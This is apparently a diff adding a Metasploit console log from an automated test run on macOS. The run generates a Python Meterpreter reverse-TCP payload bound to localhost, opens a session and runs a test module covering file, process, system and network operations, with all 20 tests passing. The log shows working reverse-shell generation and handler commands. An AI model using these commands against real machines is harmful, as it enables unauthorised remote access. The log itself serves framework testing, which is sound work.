@@ -1,0 +1,89 @@
+use python/meterpreter_reverse_tcp
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/pythonmeterpreter_reverse_tcp_session_tlv_logging20231026-3889-cutgd2txt
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> generate -o /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/child-process-rb-python-meterpreter-reverse-tcp20231026-3889-6kdurn.py -f raw AutoVerifySessionTimeout=30 lport=6004 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/pythonmeterpreter_reverse_tcp_debug_log20231026-3889-aoj34rtxt MeterpreterTryToFork=false PythonMeterpreterDebug=true
+SessionTlvLogging => file:/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/pythonmeterpreter_reverse_tcp_session_tlv_logging20231026-3889-cutgd2txt
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> [*] Writing 24968 bytes to /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/child-process-rb-python-meterpreter-reverse-tcp20231026-3889-6kdurn.py...
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 3
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6004 
+[*] Meterpreter session 5 opened (127.0.0.1:6004 -> 127.0.0.1:49673) at 2023-10-26 19:02:37 +0000
+use test/meterpreter
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> run session=5 AddEntropy=true Verbose=true
+[*] Setup: changing working directory to tmp: /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/
+[*] Setup: Creating clean directory
+[*] Creating directory meterpreter-test-dir-pvtxoiej
+[*] meterpreter-test-dir-pvtxoiej created
+[*] Setup: Now in /private/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-test-dir-pvtxoiej
+[*] Running against session 5
+[*] Session type is meterpreter and platform is osx
+[*] Starting filesystem tests
+[*] [should return the proper directory separator] received sysinfo {"Computer"=>"Mac-1698328191043.local", "OS"=>"Darwin 20.6.0 Darwin Kernel Version 20.6.0: Thu Jul  6 22:12:47 PDT 2023; root:xnu-7195.141.49.702.12~1/RELEASE_X86_64", "Architecture"=>"x64", "BuildTuple"=>nil, "System Language"=>"en_US", "Domain"=>nil, "Logged On Users"=>nil}
+[*] [should return the proper directory separator] Received separator "/" - expected: "/"
+[+] should return the proper directory separator
+[*] [should return the current working directory] CWD: /private/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-test-dir-pvtxoiej
+[+] should return the current working directory
+[+] should list files in the current directory
+[*] [should stat a directory] Current directory: "/private/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-test-dir-pvtxoiej"
+[*] [should stat a directory] Stat of current directory: #<#<Class:0x00007fbfab6e8df0>:0x00007fbfb2abe518 @stathash={"st_dev"=>16777220, "st_mode"=>16877, "st_nlink"=>2, "st_uid"=>501, "st_gid"=>20, "st_rdev"=>0, "st_ino"=>12895004034, "st_size"=>64, "st_atime"=>1698346957, "st_mtime"=>1698346957, "st_ctime"=>1698346957}>
+[+] should stat a directory
+[*] [should create and remove a dir] Directory Name: meterpreter-test-dir-wdaucsfn
+[*] [should create and remove a dir] Directory created successfully
+[*] [should create and remove a dir] Directory removed successfully
+[+] should create and remove a dir
+[*] [should change directories] Directory Name: meterpreter-test-dir-wdaucsfn
+[*] [should change directories] Directory created successfully
+[*] [should change directories] Old CWD: /private/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-test-dir-pvtxoiej
+[*] [should change directories] New CWD: /private/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-test-dir-pvtxoiej/meterpreter-test-dir-wdaucsfn
+[*] [should change directories] Back to old CWD: /private/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-test-dir-pvtxoiej
+[*] [should change directories] Directory removed successfully
+[+] should change directories
+[*] [should create and remove files] File Name: meterpreter-test-wdaucsfn
+[*] [should create and remove files] Wrote to meterpreter-test-wdaucsfn, checking contents
+[*] [should create and remove files] Wrote test
+[+] should create and remove files
+[*] [should upload a file] Remote File Name: meterpreter-test-file-wdaucsfn.txt
+[*] [should upload a file] uploading
+[*] [should upload a file] done
+[*] [should upload a file] remote file exists? true
+[+] should upload a file
+[*] [should move files] Source File Name: meterpreter-test-wdaucsfn
+[*] [should move files] Destination File Name: meterpreter-test-wdaucsfn-moved
+[+] should move files
+[*] [should copy files] Source File Name: meterpreter-test-wdaucsfn
+[*] [should copy files] Destination File Name: meterpreter-test-wdaucsfn-copied
+[+] should copy files
+[*] [should do md5 and sha1 of files] Remote File Name: meterpreter-test-file-wdaucsfn.txt
+[*] [should do md5 and sha1 of files] uploading
+[*] [should do md5 and sha1 of files] done
+[*] [should do md5 and sha1 of files] remote file exists? true
+[*] [should do md5 and sha1 of files] remote md5: 4b9d87c1f495a5a176e18ee27f85279a
+[*] [should do md5 and sha1 of files] local md5 : 4b9d87c1f495a5a176e18ee27f85279a
+[*] [should do md5 and sha1 of files] remote sha: 5ea80bb04e521918b087c695eb6930ac25ee8a7d
+[*] [should do md5 and sha1 of files] local sha : 5ea80bb04e521918b087c695eb6930ac25ee8a7d
+[+] should do md5 and sha1 of files
+[+] should enumerate supported core commands
+[+] should support 3 or more core commands
+[*] Starting process tests
+[*] [should return its own process id] Pid: 4321
+[+] should return its own process id
+[*] [should return a list of processes] PID info: {"pid"=>4321, "ppid"=>3889, "name"=>"Python", "path"=>"/Library/Frameworks/Python.framework/Versions/3.11/Resources/Python.app/Contents/MacOS/Python /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/child-process-rb-python-meterpreter-reverse-tcp20231026-3889-6kdurn.py", "session"=>nil, "user"=>"runner", "arch"=>nil}
+[+] should return a list of processes
+[*] Starting system config tests
+[+] should return a user id
+[+] should return a sysinfo Hash
+[*] Starting networking tests
+[+] should return network interfaces
+[+] should have an interface that matches session_host
+[+] should return network routes
+[*] Testing complete in 1.66 seconds
+[*] Passed: 20; Failed: 0; Skipped: 0
+[*] Cleanup: changing working directory back to /Users/runner/work/metasploit-framework/metasploit-framework
+[*] Post module execution completed
+sessions -K
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 5 closed.
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> 
